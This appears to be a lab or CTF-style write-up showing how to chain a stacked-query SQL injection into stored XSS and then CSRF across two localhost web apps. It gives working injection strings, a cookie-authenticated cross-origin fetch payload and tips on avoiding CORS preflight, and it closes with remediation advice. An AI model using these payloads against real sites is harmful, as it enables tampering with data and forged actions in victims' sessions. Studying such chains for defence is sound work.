# Stored XSS → CSRF Chain Methodology

A walkthrough for turning a SQL-injectable login form into a self-triggering
cross-site post, using the SQL injection point purely as a delivery
mechanism for stored XSS, then using that XSS to perform CSRF against a
second, unrelated site.

## Target Setup

- **Result site** (`localhost:3000`) — SQL-injection vulnerable login,
  `SELECT * FROM result WHERE student_id = '<input>' AND password = '<input>'`,
  built via string interpolation. Renders `row.first_name`, `row.last_name`,
  `row.cgpa` directly into HTML with **no output escaping**. Its DB pool is
  configured with `multipleStatements: true`.
- **Social Media site** (`localhost:3001`) — normal parameterized-query
  login, session via `sid` cookie, **no CSRF protection** on
  `POST /create`, which reads `req.body.message` and inserts a new post
  for the logged-in session's user.

Goal: as student `3005001`, simply *checking your own result* on the
Result site should silently create a post reading `I got <CGPA>` on your
own Social Media feed — no manual post-creation action.

## Step 1 — Confirm unescaped output (the XSS half of the hint)

The Result site's render function:
```js
const nameCell = row ? `${row.first_name} ${row.last_name}` : "";
```
No `escapeHtml`/encoding is applied. If `first_name` or `last_name` ever
contains `<script>...</script>`, it will execute in the viewer's browser.

## Step 2 — Find a write path through a read-only (GET) endpoint

The Result site only exposes a `GET /` login/lookup route — no visible
form for editing profile data. But the SQL injection point plus
`multipleStatements: true` means a single request can smuggle a **second
statement** after the original `SELECT`, using `;` to separate statements
and `#` to comment out the trailing part of the original query:

```
<anything>'; UPDATE result SET first_name='...' WHERE student_id='3005001'#
```

This is what makes the "database write" in the hint possible, without any
dedicated write endpoint — the injection point itself becomes the write
path via a stacked `UPDATE`.

> Note: `#` is used instead of `--` for comments. MySQL's `--` comment
> syntax requires a trailing space/newline to be recognized; `#` needs
> none, which avoids a very easy-to-lose whitespace bug when copying
> payloads through browsers/URLs.

## Step 3 — Plant the XSS payload via stacked UPDATE

Payload structure, submitted as the `student_id` value:

```sql
uany'; UPDATE result SET first_name='<script>...</script>' WHERE student_id='3005001'#
```

Key details:
- `uany'` closes the original query's `student_id = '...'` string early.
- `;` ends the first (harmless, non-matching) `SELECT` statement.
- The `UPDATE` targets your **own** row only (`WHERE student_id='3005001'`)
  — the exercise is scoped to acting only as your own account.
- `#` comments out the rest of the original template
  (`' AND password = '...'`) so it doesn't cause a syntax error.
- **Quote discipline:** SQL string literals use `'`. To avoid the
  injected string closing early, the embedded JavaScript must use `"`
  exclusively — never `'` — inside the payload. Mixing them is the most
  common way this kind of payload breaks.
- To keep the visible name intact while still injecting the payload,
  wrap the real value and the script together with `CONCAT()`:
  ```sql
  SET last_name = CONCAT('Smith', '<script>...</script>')
  ```
  `<script>` tag contents never render as visible text, so the viewer
  just sees "Liam Smith" as normal, with the payload riding along
  invisibly.

## Step 4 — Verify the write landed, independent of execution

Rather than trusting the rendered/executing page (which makes debugging
hard once a script is actually firing), read the raw stored value back
via a **separate** read-only UNION injection, and check it via the
Network tab's **Response** tab (not by letting the browser execute it):

```
' UNION SELECT 1, first_name, last_name, 4, 5 FROM result WHERE student_id='3005001'#
```

This distinguishes three failure modes that look identical from the
rendered page alone:
1. The UPDATE never ran (stale/unchanged value).
2. The UPDATE ran but stored the wrong content (quoting bug).
3. The UPDATE ran correctly, but the *script itself* has a bug (in which
   case this raw check will show the correct stored text).

## Step 5 — Get the CSRF request right

### 5a. DOM-timing pitfall
A `<script>` tag executes synchronously the instant the HTML parser
reaches it — **before** later elements in the same page have been
parsed. If your script lives inside the first `<td>` (the Name cell) and
tries to read the second `<td>` (CGPA) immediately, that element doesn't
exist yet:
```
Uncaught TypeError: Cannot read properties of undefined (reading 'innerText')
```
Fix: defer the read/request until the whole page has loaded:
```js
window.onload = function () { /* read CGPA, fire request */ }
```

### 5b. CORS vs. simple/no-cors requests
A `fetch()` to a different origin (different port counts) triggers CORS
rules. Two ways to avoid getting blocked:
- **`mode: "no-cors"`** — tells the browser you don't need to read the
  response. The request (and cookies, with `credentials: "include"`)
  still gets sent; you just can't inspect the response status/body from
  JS. This is sufficient for CSRF, since you never need to read anything
  back.
- **Real `<form>` POST submission** (optionally into a hidden `<iframe>`
  so the page doesn't visibly navigate) — form submissions have never
  been subject to CORS at all, since CORS only restricts
  script-readable responses, not form navigations. More code, but works
  even in stricter environments.
- Avoid `Content-Type: application/json` unless necessary — it forces a
  CORS **preflight** (`OPTIONS`) request first, which will simply fail
  to be sent at all if the target server doesn't answer it with the
  right headers. `application/x-www-form-urlencoded` is a "simple"
  content type that avoids preflight entirely and matches what most
  Express apps using `express.urlencoded()` expect anyway.

### 5c. Match the target endpoint's real field name
Guessing field names (`content` vs. the server's actual `message`) fails
silently — the server just treats the field as `undefined`, hits an
early-return check, and redirects without ever fulfilling the intended
Ac tion, with no visible error anywhere. **Always confirm the real field
name from source, or from the Network tab's Payload data on a manual
successful action**, before assuming a payload is broken at the
XSS/SQLi layer when it might just be the wrong parameter name.

### Final working payload shape

```js
<script>
window.onload = function () {
  var cgpa = document.querySelectorAll("td")[1].innerText;
  fetch("http://localhost:3001/create", {
    method: "POST",
    mode: "no-cors",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "message=I got " + cgpa
  });
};
</script>
```

Embedded into the stacked UPDATE:

```sql
uany'; UPDATE result SET last_name=CONCAT('Smith','<script>window.onload=function(){var cgpa=document.querySelectorAll("td")[1].innerText;fetch("http://localhost:3001/create",{method:"POST",mode:"no-cors",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"message=I got "+cgpa})}</script>') WHERE student_id='3005001'#
```

## Step 6 — Diagnose "302 redirect" ambiguity

Every branch of the target's `POST /create` handler ends in
`res.redirect(...)`, whether the action succeeded, was skipped due to an
empty/missing field, or the session was invalid. A `302` status alone
proves nothing. Check the **`Location`** response header instead:

- `Location: /login` → no valid session cookie was sent — confirm you're
  actually logged into the target site in the same browser at the time
  the payload fires.
- `Location: /` → authenticated and processed, but the actual outcome
  (inserted vs. silently skipped) still depends on whether the expected
  field was present and non-empty. Confirm by checking the request's
  **Payload/Form Data** tab for the exact field name and value sent, or
  simply by checking the target feed directly.

## Key Takeaways

- **A read-only-looking (GET-only) endpoint can still be a write
  vector** if the underlying query is built with string interpolation
  and the DB driver allows stacked statements. The absence of a visible
  "edit" form doesn't mean there's no write path.
- **Unescaped output turns any writable field into a stored-XSS
  vector.** The vulnerability isn't really about `<script>` tags being
  "smart" — it's that user-controlled data (however it got there) is
  placed into HTML without encoding.
- **Stored XSS is a stepping stone, not the end goal, when chained with
  CSRF.** The payload's job isn't to alert or deface the page — it's to
  execute *legitimate-looking, cookie-authenticated* requests against a
  target that trusts the browser's session state, from inside the
  victim's own browser.
- **CSRF succeeds because the target has no CSRF token / SameSite
  protection**, not because of anything clever in the request itself —
  once cookies are attached automatically, the server cannot distinguish
  a script-fired request from a real user click.

## Remediation (both sides)

**Result site — parameterize queries and escape output:**
```js
const sql = "SELECT * FROM result WHERE student_id = ? AND password = ?";
const [rows] = await pool.execute(sql, [student_id, password]);
```
```js
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
const nameCell = row ? `${escapeHtml(row.first_name)} ${escapeHtml(row.last_name)}` : "";
```

**Social Media site — add CSRF protection to state-changing routes:**
- Issue a per-session CSRF token, embed it as a hidden field in the
  post-creation form, and reject `POST /create` requests that don't
  include a matching token.
- Alternatively/additionally, set the session cookie with
  `SameSite=Strict` or `SameSite=Lax`, which would prevent the cookie
  from being sent on this kind of cross-origin request in the first
  place.

Either mitigation independently breaks this exact chain; both together
close it robustly.
